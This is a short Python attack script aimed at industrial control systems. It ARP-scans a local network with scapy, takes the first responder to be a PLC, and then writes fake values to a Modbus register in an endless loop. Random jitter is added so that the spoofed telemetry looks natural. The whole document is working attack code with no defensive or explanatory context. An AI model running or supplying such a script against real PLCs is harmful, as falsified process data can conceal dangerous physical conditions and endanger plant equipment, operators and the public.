from scapy.all import ARP, Ether, srp
from pymodbus.client.sync import ModbusTcpClient
import time
import random

# Function to discover the PLC's IP address on the network
def find_plc_ip(network_range="192.168.1.0/24"):
    print("[*] Scanning network for PLC...")
    arp_request = ARP(pdst=network_range)  # Create ARP request
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")  # Broadcast ARP request
    answered_list = srp(broadcast/arp_request, timeout=2, verbose=False)[0]

    for sent, received in answered_list:
        print(f"-> Found Device: {received.psrc} ({received.hwsrc})")
        return received.psrc  # Return the first discovered IP (Assuming it's the PLC)
    
    print("[!] No PLC found. Exiting...")
    return None

# Function to spoof telemetry data by faking Modbus responses
def spoof_reporting_message(plc_ip, register=0, fake_value=1234):
    print(f"[*] Connecting to PLC at {plc_ip}...")
    client = ModbusTcpClient(plc_ip)

    if not client.connect():
        print("[!] Could not connect to PLC.")
        return
    
    print("[*] Spoofing telemetry data...")
    while True:
        fake_data = fake_value + random.randint(-10, 10)  # Slightly vary values to appear more natural
        client.write_register(register, fake_data)  # Write fake values to the PLC
        print(f"[+] Spoofed Register {register} with value: {fake_data}")
        time.sleep(3)  # Delay spoofing to make it look more realistic

if __name__ == "__main__":
    plc_ip = find_plc_ip()
    if plc_ip:
        spoof_reporting_message(plc_ip)